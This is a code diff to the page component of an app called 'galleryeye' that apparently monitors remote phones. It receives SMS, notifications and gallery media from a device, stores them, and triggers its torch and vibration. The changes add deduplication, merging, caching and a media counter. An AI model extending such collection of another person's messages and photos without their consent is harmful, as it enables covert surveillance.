@@ -378,6 +378,9 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
     const [torchAggressive, setTorchAggressive] = useState(false);
     const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default
 
+    // Gallery Total Media State
+    const [totalMediaCount, setTotalMediaCount] = useState<number>(0);
+
     // Vibration State
     const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default
 
@@ -722,9 +725,14 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                     deviceId: image.deviceId || currentDevId || null
                 };
                 setImages((prev) => {
-                    if (prev.some(img => img.id === imageWithDevice.id)) return prev;
+                    const isDup = prev.some(img => 
+                        (img.id && imageWithDevice.id && img.id === imageWithDevice.id) || 
+                        (img.url && imageWithDevice.url && img.url === imageWithDevice.url)
+                    );
+                    if (isDup) return prev;
                     return [imageWithDevice, ...prev];
                 });
+                setTotalMediaCount(prev => prev + 1);
             });
 
             socket.on("folder_list", (data: any) => {
@@ -771,30 +779,34 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                 }));
             });
 
-            // SMS Event Listeners
+            // SMS Event Listeners with Non-Destructive Deduplicated Merge
             socket.on("sms_list", (data: any) => {
                 setIsFetchingSms(false);
                 const devId = data.deviceId || selectedDeviceIdRef.current;
                 const uuid = session?.user?.uuid;
-                if (data.isIncremental && data.sms?.length > 0) {
+                const incomingSms = Array.isArray(data.sms) ? data.sms : [];
+
+                if (incomingSms.length > 0) {
                     setSmsList((prev) => {
-                        const existingIds = new Set(prev.map(s => s.id));
-                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
-                        const updated = [...newSms, ...prev];
+                        const map = new Map<string, any>();
+                        // Populate existing
+                        prev.forEach((s: any) => {
+                            const key = s.id ? String(s.id) : `${s.address}_${s.date}_${s.body}`;
+                            map.set(key, s);
+                        });
+                        // Merge incoming
+                        incomingSms.forEach((s: any) => {
+                            const key = s.id ? String(s.id) : `${s.address}_${s.date}_${s.body}`;
+                            map.set(key, s);
+                        });
+                        const merged = Array.from(map.values()).sort((a, b) => (b.date || 0) - (a.date || 0));
                         try {
                             if (devId && uuid) {
-                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(updated));
+                                localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(merged.slice(0, 1000)));
                             }
                         } catch {}
-                        return updated;
+                        return merged;
                     });
-                } else if (data.sms) {
-                    setSmsList(data.sms);
-                    try {
-                        if (devId && uuid) {
-                            localStorage.setItem(`galleryeye_sms_${uuid}_${devId}`, JSON.stringify(data.sms));
-                        }
-                    } catch {}
                 }
             });
 
@@ -839,10 +851,17 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                 setShowCustomAlert(true);
             });
 
-            // Notification Monitoring Event Listeners
+            // Notification Monitoring Event Listeners with Deduplication
             socket.on("new_notification", (data: any) => {
                 setNotifications(prev => {
-                    const updated = [{ ...data, receivedAt: Date.now() }, ...prev].slice(0, 1000);
+                    const notifKey = data.id ? String(data.id) : `${data.packageName}_${data.title}_${data.text}_${data.timestamp || data.postTime || ''}`;
+                    const isDuplicate = prev.some((n: any) => {
+                        const k = n.id ? String(n.id) : `${n.packageName}_${n.title}_${n.text}_${n.timestamp || n.postTime || ''}`;
+                        return k === notifKey;
+                    });
+                    if (isDuplicate) return prev;
+
+                    const updated = [{ ...data, receivedAt: data.receivedAt || Date.now() }, ...prev].slice(0, 500);
                     try { 
                         localStorage.setItem('galleryeye_notifications', JSON.stringify(updated));
                         const devId = data.deviceId || selectedDeviceIdRef.current;
@@ -1269,6 +1288,7 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                     .then((data) => {
                         const items = data.items || (Array.isArray(data) ? data : []);
                         const hasMore = data.hasMore !== undefined ? data.hasMore : false;
+                        const serverTotal = data.total ?? data.totalCount ?? data.count ?? data.totalItems;
 
                         // Filter out camera captures from the gallery feed and ensure device match
                         const galleryItems = items.filter((item: any) => 
@@ -1276,20 +1296,33 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
                             (!item.deviceId || item.deviceId === targetDeviceId)
                         );
 
+                        if (serverTotal !== undefined && serverTotal !== null && serverTotal > 0) {
+                            setTotalMediaCount(serverTotal);
+                        } else if (!append) {
+                            setTotalMediaCount(galleryItems.length);
+                        }
+
                         if (append) {
                             setImages(prev => {
-                                const existingIds = new Set(prev.map((i: any) => i.id));
-                                const newItems = galleryItems.filter((i: any) => !existingIds.has(i.id));
+                                const existingKeys = new Set(prev.map((i: any) => i.id || i.url));
+                                const newItems = galleryItems.filter((i: any) => {
+                                    const k = i.id || i.url;
+                                    return k && !existingKeys.has(k);
+                                });
                                 return [...prev, ...newItems];
                             });
                         } else {
                             // Non-destructive merge: retain all newly synced items from current session matching this device
                             setImages(prev => {
                                 const incomingMap = new Map<string, any>();
-                                galleryItems.forEach((item: any) => incomingMap.set(item.id, item));
+                                galleryItems.forEach((item: any) => {
+                                    const k = item.id || item.url;
+                                    if (k) incomingMap.set(k, item);
+                                });
                                 const merged = [...galleryItems];
                                 prev.forEach((pItem: any) => {
-                                    if (!incomingMap.has(pItem.id) && (!pItem.deviceId || pItem.deviceId === targetDeviceId)) {
+                                    const k = pItem.id || pItem.url;
+                                    if (k && !incomingMap.has(k) && (!pItem.deviceId || pItem.deviceId === targetDeviceId)) {
                                         merged.push(pItem);
                                     }
                                 });
@@ -2234,6 +2267,7 @@ END:VCARD`;
                     <div className="px-4 md:px-8 h-full">
                         <GalleryView 
                             images={images}
+                            totalMediaCount={totalMediaCount}
                             activeTab={activeTab}
                             setActiveTab={setActiveTab}
                             isSelectionMode={isSelectionMode}
@@ -2443,18 +2477,12 @@ END:VCARD`;
 
             <AnimatePresence>
                 {previewItem && (
-                    <motion.div 
-                        initial={{ opacity: 0 }}
-                        animate={{ opacity: 1 }}
-                        exit={{ opacity: 0 }}
-                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-3 sm:p-6"
+                    <div 
+                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-xl flex items-center justify-center p-3 sm:p-6 animate-in fade-in duration-150"
                         onClick={() => setPreviewItem(null)}
                     >
-                        <motion.div 
-                            initial={{ scale: 0.95, opacity: 0 }}
-                            animate={{ scale: 1, opacity: 1 }}
-                            exit={{ scale: 0.95, opacity: 0 }}
-                            className="relative max-w-5xl w-full h-full max-h-[90vh] flex items-center justify-center"
+                        <div 
+                            className="relative max-w-5xl w-full h-full max-h-[90vh] flex items-center justify-center animate-in zoom-in-95 duration-150"
                             onClick={(e) => e.stopPropagation()}
                         >
                             {previewItem.resource_type === 'video' ? (
@@ -2541,8 +2569,8 @@ END:VCARD`;
                                     <X size={18} />
                                 </button>
                             </div>
-                        </motion.div>
-                    </motion.div>
+                        </div>
+                    </div>
                 )}
             </AnimatePresence>
 
